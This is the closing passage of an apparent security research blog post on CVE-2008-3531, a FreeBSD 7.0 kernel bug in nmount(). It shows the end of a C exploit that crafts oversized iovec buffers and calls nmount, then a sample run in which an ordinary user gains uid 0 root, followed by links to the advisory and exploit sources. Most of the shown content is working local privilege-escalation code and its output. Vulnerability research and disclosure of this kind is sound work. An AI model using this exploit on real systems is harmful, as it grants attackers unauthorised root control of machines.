    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> <span style="color: #000066;">calloc</span><span style="color: #009900;">&#40;</span>BUFSIZE<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: #009900;">&#40;</span><span style="color: #993333;">char</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">==</span> NULL<span style="color: #009900;">&#41;</span>
    <span style="color: #009900;">&#123;</span>
        <span style="color: #000066;">perror</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"calloc"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        rmdir<span style="color: #009900;">&#40;</span>DIRPATH<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        <span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #009900;">&#125;</span>
&nbsp;
    <span style="color: #000066;">memset</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #339933;">,</span> <span style="color: #208080;">0x41</span><span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span>BUFSIZE <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> BUFSIZE<span style="color: #339933;">;</span>
&nbsp;
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">5</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">"BBBB"</span><span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">5</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> <span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">5</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"[*] calling nmount()<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>nmount<span style="color: #009900;">&#40;</span>iov<span style="color: #339933;">,</span> <span style="color: #0000dd;">6</span><span style="color: #339933;">,</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span>
    <span style="color: #009900;">&#123;</span>
        <span style="color: #000066;">perror</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"nmount"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        rmdir<span style="color: #009900;">&#40;</span>DIRPATH<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        <span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #009900;">&#125;</span>
&nbsp;
    <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"[*] unmounting and deleting %s<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">,</span> DIRPATH<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    unmount<span style="color: #009900;">&#40;</span>DIRPATH<span style="color: #339933;">,</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    rmdir<span style="color: #009900;">&#40;</span>DIRPATH<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #b1b100;">return</span> EXIT_SUCCESS<span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span></pre>
      </td>
    </tr>
  </table>
</div>

Finally, a sample run of the exploit:

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;"><span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ <span style="color: #c20cb9; font-weight: bold;">uname</span> <span style="color: #660033;">-rsi</span>
FreeBSD <span style="color: #000000;">7.0</span>-RELEASE GENERIC
<span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ sysctl vfs.usermount
vfs.usermount: <span style="color: #000000;">1</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ <span style="color: #c20cb9; font-weight: bold;">id</span>
<span style="color: #007800;">uid</span>=<span style="color: #000000;">1001</span><span style="color: #7a0874; font-weight: bold;">&#40;</span>argp<span style="color: #7a0874; font-weight: bold;">&#41;</span> <span style="color: #007800;">gid</span>=<span style="color: #000000;">1001</span><span style="color: #7a0874; font-weight: bold;">&#40;</span>argp<span style="color: #7a0874; font-weight: bold;">&#41;</span> <span style="color: #007800;">groups</span>=<span style="color: #000000;">1001</span><span style="color: #7a0874; font-weight: bold;">&#40;</span>argp<span style="color: #7a0874; font-weight: bold;">&#41;</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ <span style="color: #c20cb9; font-weight: bold;">gcc</span> <span style="color: #660033;">-Wall</span> cve-<span style="color: #000000;">2008</span>-<span style="color: #000000;">3531</span>.c <span style="color: #660033;">-o</span> cve-<span style="color: #000000;">2008</span>-<span style="color: #000000;">3531</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ .<span style="color: #000000; font-weight: bold;">/</span>cve-<span style="color: #000000;">2008</span>-<span style="color: #000000;">3531</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> vptr = 0x006e776f
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> calling nmount<span style="color: #7a0874; font-weight: bold;">&#40;</span><span style="color: #7a0874; font-weight: bold;">&#41;</span>
nmount: Unknown error: <span style="color: #660033;">-1036235776</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span>argp<span style="color: #000000; font-weight: bold;">@</span>leon ~<span style="color: #7a0874; font-weight: bold;">&#93;</span>$ <span style="color: #c20cb9; font-weight: bold;">id</span>
<span style="color: #007800;">uid</span>=<span style="color: #000000;"></span><span style="color: #7a0874; font-weight: bold;">&#40;</span>root<span style="color: #7a0874; font-weight: bold;">&#41;</span> <span style="color: #007800;">gid</span>=<span style="color: #000000;"></span><span style="color: #7a0874; font-weight: bold;">&#40;</span>wheel<span style="color: #7a0874; font-weight: bold;">&#41;</span> <span style="color: #007800;">egid</span>=<span style="color: #000000;">1001</span><span style="color: #7a0874; font-weight: bold;">&#40;</span>argp<span style="color: #7a0874; font-weight: bold;">&#41;</span> <span style="color: #007800;">groups</span>=<span style="color: #000000;">1001</span><span style="color: #7a0874; font-weight: bold;">&#40;</span>argp<span style="color: #7a0874; font-weight: bold;">&#41;</span></pre>
      </td>
    </tr>
  </table>
</div>

And this concludes my post. I hope you enjoyed reading this as much as I enjoyed writing it.

 [1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3531
 [2]: http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc
 [3]: http://www.freebsd.org/cgi/man.cgi?query=nmount&#038;apropos=0&#038;sektion=2&#038;manpath=FreeBSD+7.0-RELEASE&#038;format=html
 [4]: http://www.freebsd.org/cgi/man.cgi?query=sysctl&#038;sektion=8&#038;apropos=0&#038;manpath=FreeBSD+7.0-RELEASE
 [5]: http://www.freebsd.org/cgi/man.cgi?query=mmap&#038;apropos=0&#038;sektion=2&#038;manpath=FreeBSD+7.0-RELEASE&#038;format=html
 [6]: http://www.freebsd.org/cgi/man.cgi?query=sysctl&#038;sektion=3&#038;apropos=0&#038;manpath=FreeBSD+7.0-RELEASE
 [7]: http://census-labs.com/research/#kernexp
 [8]: http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf
 [9]: http://census-labs.com/media/cve-2008-3531-kernelcode.s
 [10]: http://census-labs.com/media/cve-2008-3531.c